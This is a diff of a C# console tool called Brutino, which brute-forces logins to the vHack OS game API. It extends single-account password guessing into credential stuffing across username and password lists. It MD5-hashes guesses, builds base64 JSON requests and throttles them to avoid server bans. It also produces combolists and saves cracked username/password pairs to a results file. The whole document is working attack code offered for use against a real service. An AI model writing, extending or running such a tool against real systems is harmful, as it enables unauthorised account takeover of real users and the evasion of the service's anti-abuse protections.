@@ -13,10 +13,14 @@ namespace Brutino
     class MainClass
     {
         public static int temp = 0;
+        public static int temp_2 = 0;
         public static string wordlist;
         public static string username;
+        public static int found = 0;
+        public static string[] result = new string[1000];
         public static DateTime today = DateTime.Now;
-        public static string file = ($@"\brutino_logs\resume{today:dd-MM-yy}at{today:HH_mm_ss_mstt}.log");
+        public static string file = ($@"./brutino_logs/resume{today:dd-MM-yy}at{today:HH_mm_ss_mstt}.log");
+        public static string output = ($@"./results/Results of {today:dd-MM-yy}at{today:HH_mm_ss_mstt}.txt");
 
         public static string CalculateMD5Hash(string input)
         {
@@ -44,6 +48,13 @@ namespace Brutino
 
         }
 
+        public static string Base64Encode(string plainText)
+        {
+            //Create Base64encode in order to format user get parameter for http request
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return System.Convert.ToBase64String(plainTextBytes);
+        }
+
         public static void initial()
         {
             //Welcome dear user! Banner graphic
@@ -54,6 +65,11 @@ namespace Brutino
             if (!Directory.Exists("brutino_logs"))
             {
                 Directory.CreateDirectory("brutino_logs");
+            }
+
+            if (!Directory.Exists("results"))
+            {
+                Directory.CreateDirectory("results");
             }
 
             Console.ForegroundColor = ConsoleColor.DarkGreen;
@@ -74,9 +90,8 @@ namespace Brutino
             Console.ForegroundColor = ConsoleColor.White;
         }
 
-        public static void table_trying(string ip, string username, string line, int count, int tried, double tProgress)
+        public static void table_trying(string ip, string testing_user, string line, int count, int tried, double tProgress, int found, int u, int j, string[] rs)
         {
-
             //Write infos while bruteforcing
             Console.Clear();
             initial();
@@ -87,13 +102,13 @@ namespace Brutino
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("\t Account\t");
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.WriteLine("{0}", username);
+            Console.WriteLine("{0}", testing_user);
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("\t Trying\t        ");
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine(line);
             Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\t Password count\t");
+            Console.Write("\t Total Credentials ");
             Console.ForegroundColor = ConsoleColor.Magenta;
             Console.WriteLine(count);
             Console.ForegroundColor = ConsoleColor.White;
@@ -101,48 +116,94 @@ namespace Brutino
             Console.ForegroundColor = ConsoleColor.DarkYellow;
             Console.WriteLine(tried);
             Console.ForegroundColor = ConsoleColor.White;
+            Console.Write("\t Found\t\t");
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+            Console.WriteLine(found);
+            Console.ForegroundColor = ConsoleColor.White;
             Console.Write("\t Time elapsed\t");
             Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine((int)tProgress + " minutes");
+            if ((int)tProgress >= 0 && (int)tProgress <= 60)
+                Console.WriteLine((int)tProgress + " minutes");
+            else
+                Console.WriteLine((int)tProgress + " hours");
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("\t Progress\t");
             Console.ForegroundColor = ConsoleColor.Blue;
             double dProgress = ((double)tried / (double)count) * 100.0;
             Console.WriteLine((int)dProgress + "%");
 
-            //Save results every 50 attempts you can change value of saves attempts
+            //Save results every 50 attempts
             if (tried == (temp + 50))
             {
-                saveProgress(count,tried);
+                saveProgress(j, u);
                 temp = tried;
             }
 
+            //If Found a result update output file with all infos about cracked account
+            if (found == (temp_2 + 1))
+            {
+                save_found(rs);
+                temp_2 = found;
+            }
         }
 
-        public static void saveProgress(int count , int tried)
+        public static void save_found(string[] rs)
+        {
+            if (!File.Exists(output))
+            {
+                File.Create(output).Close();
+            }
+
+            File.WriteAllLines(output, rs);
+        }
+
+        public static void saveProgress(int count, int u)
         {
             //Save Progress of attack
-            string save = "position=" + tried + "\nfile=" + wordlist + "\nusername=" + username;
+            string save = "position=" + count + "\nfile=" + wordlist + "\nfile_usernames=" + username + "\nusername=" + u;
             File.WriteAllText(file, save);
         }
 
-        public static void table_found(string username, double elapsed, string password)
+        public static void table_found(string[] rs, double elapsed, int found)
         {
             //Well Done! Password found write results
             Console.Clear();
             initial();
             Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\n\t Account\t");
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("{0}", username);
-            Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\t Status Password ");
+            Console.Write("\t Status ");
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("Found!");
-            Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\t Password\t");
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine(password);
+            for (int i = 1; i <= found; i++)
+            {
+                Console.WriteLine(rs[i]);
+            }
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.Write("\t Elapsed time\t");
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            if ((int)elapsed >= 0 && (int)elapsed <= 60)
+                Console.WriteLine((int)elapsed + " minutes");
+            else
+                Console.WriteLine((int)elapsed + " hours");
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.Write("\t Saved to ");
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine(output);
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.WriteLine("\n\n Type a key to exit");
+            Console.ReadLine();
+            System.Environment.Exit(1);
+        }
+
+        public static void table_not_found(double elapsed)
+        {
+            //Ops, attack failed no results found
+            Console.Clear();
+            initial();
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.Write("\t Status \t");
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("No Accounts Cracked :(!");
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("\t Elapsed time\t");
             Console.ForegroundColor = ConsoleColor.Magenta;
@@ -154,44 +215,55 @@ namespace Brutino
 
         }
 
-        public static void table_not_found(string username, double elapsed)
+        public static void generate_combo(string username)
         {
-            //Ops, attack failed no results found
-            Console.Clear();
-            initial();
+            var time = System.Diagnostics.Stopwatch.StartNew();
+            Console.WriteLine("Starting formatting... please wait");
+            string[] lines = File.ReadAllLines(username);
+            int size = File.ReadAllLines(username).Length, count = 0;
+            string[] line = new string[size];
+            string directory = Directory.GetCurrentDirectory();
+            string usr = Path.GetFileNameWithoutExtension(username);
+            string save = directory + $@"/{usr}" + "_formatted" + ".txt";
+
+            for (int i = 0; i < size; i++)
+            {
+                line[i] = lines[i] + "\n" + lines[i].ToLower() + "\n" + lines[i].ToUpper() + "\n"; //+ lines[i].ToUpper().ElementAt(0)
+                count++;
+            }
+
+            try
+            {
+                File.WriteAllLines(save, line);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error while saving file: {0}", ex);
+            }
+
+
+            var elapsed = time.Elapsed.Minutes;
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine(" Wordlist succesfully formatted in {0:N3} minutes \n Saved in {1}", elapsed, save);
+            Console.ForegroundColor = ConsoleColor.DarkCyan;
+            Console.WriteLine(" Total formatted {0} users", count);
             Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\n\t Account\t\t");
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("{0}", username);
-            Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\t Status Password\t");
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("Not Found!");
-            Console.ForegroundColor = ConsoleColor.White;
-            Console.Write("\t Elapsed time\t\t");
-            Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.WriteLine((int)elapsed + " minutes");
-            Console.ForegroundColor = ConsoleColor.White;
-            Console.WriteLine("\n\n Type a key to exit");
+            Console.WriteLine("\nType a key to return back...");
             Console.ReadLine();
+            Main(null);
             System.Environment.Exit(1);
 
         }
 
-        public static string Base64Encode(string plainText)
-        {
-            //Create Base64encode in order to format user get parameter for http request
-            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
-            return System.Convert.ToBase64String(plainTextBytes);
-        }
+        public static int u, j;
 
-        public static void Main(string[] args)
+        public static void Main(string[] args = null)
         {
             initial();
-            int count = 0, tried = 0;
-            string respond, ip, choose, resume;
+            int count = 0, tried = 0, count_users = 0;
+            string respond, ip, choose, resume, combo;
             string[] check_row;
-            int position = 1    ;
+            int position = 1, Progress_User = 1;
 
             //Api VhackOs Url
             string api = "https://api.vhack.cc/mobile/15/login.php";
@@ -199,78 +271,118 @@ namespace Brutino
             //Api to get your ip address
             string api_ip = "https://ident.me";
 
+
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.Write("Generate a combolist?(Y/N)");
+            Console.ForegroundColor = ConsoleColor.DarkYellow;
+            combo = Console.ReadLine();
+
             do
             {
 
-                Console.Write("Start new Attack(1) or resume(2)? ");
-                Console.ForegroundColor = ConsoleColor.DarkYellow;
-                choose = Console.ReadLine();
-
-                if (choose == "2")
+                if (combo.ToLower() == "n")
                 {
-                    Console.ForegroundColor = ConsoleColor.White;
-                    Console.Write("Insert resuming file=> ");
-                    Console.ForegroundColor = ConsoleColor.DarkYellow;
-                    resume = Console.ReadLine();
+                    do
+                    {
+                        Console.ForegroundColor = ConsoleColor.White;
+                        Console.Write("Start new Attack(1) or resume(2)? ");
+                        Console.ForegroundColor = ConsoleColor.DarkYellow;
+                        choose = Console.ReadLine();
 
-                    if (!File.Exists(resume))
-                    {
-                        Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("File not found! Quitting...");
-                        System.Environment.Exit(4);
-                    }
-                    else
-                    {
-                        if (new FileInfo(resume).Length == 0)
+                        if (choose == "2")
                         {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("This file is empty! Quitting...");
-                            System.Environment.Exit(4);
-                        }
-                        else
-                        {
-                            check_row = File.ReadAllLines(resume);
-                            if (check_row[0].Contains("position=") && check_row[1].Contains("file=") && check_row[2].Contains("username="))
+                            Console.ForegroundColor = ConsoleColor.White;
+                            Console.Write("Insert resuming file=> ");
+                            Console.ForegroundColor = ConsoleColor.DarkYellow;
+                            resume = Console.ReadLine();
+
+                            if (!File.Exists(resume))
                             {
-                                position = Int32.Parse(check_row[0].Replace("position=", ""));
-                                wordlist = check_row[1].Replace("file=", "");
-                                username = check_row[2].Replace("username=", "");
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.WriteLine("File not found! Quitting...");
+                                System.Environment.Exit(4);
                             }
                             else
                             {
-                                Console.ForegroundColor = ConsoleColor.Red;
-                                Console.WriteLine("File is bad formatted! Quitting...");
-                                System.Environment.Exit(4);
+                                if (new FileInfo(resume).Length == 0)
+                                {
+                                    Console.ForegroundColor = ConsoleColor.Red;
+                                    Console.WriteLine("This file is empty! Quitting...");
+                                    System.Environment.Exit(4);
+                                }
+                                else
+                                {
+                                    check_row = File.ReadAllLines(resume);
+                                    if (check_row[0].Contains("position=") && check_row[1].Contains("file=") && check_row[2].Contains("file_usernames=") && check_row[3].Contains("username="))
+                                    {
+                                        position = Int32.Parse(check_row[0].Replace("position=", ""));
+                                        wordlist = check_row[1].Replace("file=", "");
+                                        username = check_row[2].Replace("file_usernames=", "");
+                                        Progress_User = Int32.Parse(check_row[3].Replace("username=", ""));
+                                    }
+                                    else
+                                    {
+                                        Console.ForegroundColor = ConsoleColor.Red;
+                                        Console.WriteLine("File is bad formatted! Quitting...");
+                                        System.Environment.Exit(4);
+                                    }
+                                }
                             }
                         }
-                    }
+
+                        if (choose == "1")
+                        {
+                            do
+                            {
+                                do
+                                {
+                                    Console.ForegroundColor = ConsoleColor.White;
+                                    Console.Write("Username List=> ");
+                                    Console.ForegroundColor = ConsoleColor.DarkYellow;
+                                    username = Console.ReadLine();
+
+                                    if (!File.Exists(username))
+                                    {
+                                        Console.ForegroundColor = ConsoleColor.Red;
+                                        Console.WriteLine("User list not found, try again");
+                                        Console.ForegroundColor = ConsoleColor.White;
+                                    }
+                                } while (!File.Exists(username));
+
+                                Console.ForegroundColor = ConsoleColor.White;
+                                Console.Write("Wordlist patch=> ");
+                                Console.ForegroundColor = ConsoleColor.DarkYellow;
+                                wordlist = Console.ReadLine();
+
+                                if (!File.Exists(wordlist))
+                                {
+                                    Console.ForegroundColor = ConsoleColor.Red;
+                                    Console.WriteLine("Wordlist not found, try again");
+                                    Console.ForegroundColor = ConsoleColor.White;
+                                }
+
+                            } while ((!File.Exists(wordlist)));
+                        }
+                    } while ((choose != "1" && choose != "2"));
                 }
-
-            } while ((choose != "1" && choose != "2"));
-
-            if (choose == "1")
-            {
-                do
+                else if (combo.ToLower() == "y")
                 {
                     Console.ForegroundColor = ConsoleColor.White;
-                    Console.Write("Username=> ");
+                    Console.Write("Username List=> ");
                     Console.ForegroundColor = ConsoleColor.DarkYellow;
                     username = Console.ReadLine();
 
-                    Console.ForegroundColor = ConsoleColor.White;
-                    Console.Write("Wordlist patch=> ");
-                    Console.ForegroundColor = ConsoleColor.DarkYellow;
-                    wordlist = Console.ReadLine();
-
-                    if (!File.Exists(wordlist))
+                    if (!File.Exists(username))
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("Wordlist not found, try again");
+                        Console.WriteLine("User list not found, try again");
                         Console.ForegroundColor = ConsoleColor.White;
                     }
+                }
+            } while ((combo.ToLower() != "y") && (combo.ToLower() != "n") || !File.Exists(username));
 
-                } while (!File.Exists(wordlist));
-            }
+            if (combo.ToLower() == "y")
+                generate_combo(username);
 
             Console.WriteLine("\nProcess starting please wait....");
 
@@ -299,35 +411,42 @@ namespace Brutino
 
             try
             {
-                //Counting how many passwords in the file
+                //Counting how many passwords and users in files
+                count_users = File.ReadAllLines(username).Length;
                 count = File.ReadAllLines(wordlist).Length;
 
-                //using (var reader = new StreamReader(wordlist))
-                //{
-                //while (!reader.EndOfStream)
-                for (int j = position-1; j <= count; j++)
-                {
-                    //Initializing strings of requests for every attempt
-                    hash = string.Empty;
-                    jasonString = string.Empty;
-                    jasonBased = string.Empty;
-                    md5_jason_1 = string.Empty;
-                    password = string.Empty;
-                    req = string.Empty;
-                    try
-                    {
-                        var line = File.ReadAllLines(wordlist);
 
+                int total = count_users * count;
+
+                for (u = Progress_User - 1; u < count_users; u++)
+                {
+                    for (j = position - 1; j < count; j++)
+                    {
+                        //Initializing strings of requests for every attempt
+                        hash = string.Empty;
+                        jasonString = string.Empty;
+                        jasonBased = string.Empty;
+                        md5_jason_1 = string.Empty;
+                        password = string.Empty;
+                        req = string.Empty;
                         tried++;
+
+                        var line = File.ReadAllLines(wordlist);
+                        var usr = File.ReadAllLines(username);
 
                         var time = progress.Elapsed.TotalMinutes;
 
-                        table_trying(ip, username, line[j], count, tried, time);
+                        if (time > 60)
+                        {
+                            time = progress.Elapsed.TotalHours;
+                        }
+
+                        table_trying(ip, usr[u], line[j], total, tried, time, found, u, j, result);
 
                         //Calculate MD5 hash of password
                         hash = CalculateMD5Hash(line[j]);
                         //Replacing signalers with username plaintext and password already md5 hashed
-                        jasonString = String.Replace("#replace#", username).Replace("#replace2#", hash);
+                        jasonString = String.Replace("#replace#", usr[u]).Replace("#replace2#", hash);
 
                         jasonBased = Base64Encode(jasonString);
 
@@ -344,46 +463,39 @@ namespace Brutino
                         url = api + req.Replace("#replace3#", jasonBased).Replace("#replace4#", password);
 
                         //Avoid banning by the server with this delay
-                        Thread.Sleep(300);
+                        Thread.Sleep(200);
 
-                        //Start the request
-                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-                        request.AutomaticDecompression = DecompressionMethods.GZip;
-
-                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-                        using (Stream stream = response.GetResponseStream())
-                        using (StreamReader reader_2 = new StreamReader(stream))
+                        try
                         {
-                            //Saving the html (That's it's a jason response by the page) to a string
-                            html = reader_2.ReadToEnd();
+                            //Start the request
+                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+                            request.AutomaticDecompression = DecompressionMethods.GZip;
+
+                            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+                            using (Stream stream = response.GetResponseStream())
+                            using (StreamReader reader_2 = new StreamReader(stream))
+                            {
+                                //Saving the html (That's it's a jason response by the page) to a string
+                                html = reader_2.ReadToEnd();
+                            }
+                        }
+                        catch (Exception)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("Unable to send requests anymore stopping.....\n");
+                            Console.ReadLine();
+                            System.Environment.Exit(3);
                         }
 
                         //Checking if jason response contains the accesstoken and uid, if yes you are logged in and you're password is correct
                         if (html.Contains("accesstoken") && html.Contains("uid"))
                         {
-                            watch_for_this.Stop();
-                            var ela = watch_for_this.Elapsed.TotalMinutes;
-                            table_found(username, ela, line[j]);
+                            found++;
+                            result[found] = "\t Username " + usr[u] + " Password: " + line[j];
                         }
+                        position = 1;
                     }
-                    catch (Exception)
-                    {
-                        if (j == count)
-                        {
-                            watch_for_this.Stop();
-                            var elapsed = watch_for_this.Elapsed.TotalMinutes;
-                            table_not_found(username, elapsed);
-                        }
-                        else
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine("Unable to send requests anymore stopping.....\n");
-                            System.Environment.Exit(3);
-                        }
-                    }
-
                 }
-                // }
             }
             catch (Exception ex)
             {
@@ -392,7 +504,33 @@ namespace Brutino
                 Console.ReadLine();
                 System.Environment.Exit(0);
             }
-            //If you reach this point, you dind't able to find any password in that list... :(
+
+            if (found == 0)
+            {
+                watch_for_this.Stop();
+                var elapsed = watch_for_this.Elapsed.TotalMinutes;
+
+                if (elapsed > 60)
+                {
+                    elapsed = watch_for_this.Elapsed.TotalHours;
+                }
+
+                table_not_found(elapsed);
+            }
+
+            if (u == count_users && found > 0)
+            {
+
+                watch_for_this.Stop();
+                var ela = watch_for_this.Elapsed.TotalMinutes;
+
+                if (ela > 60)
+                {
+                    ela = watch_for_this.Elapsed.TotalHours;
+                }
+
+                table_found(result, ela, found);
+            }
         }
     }
 }
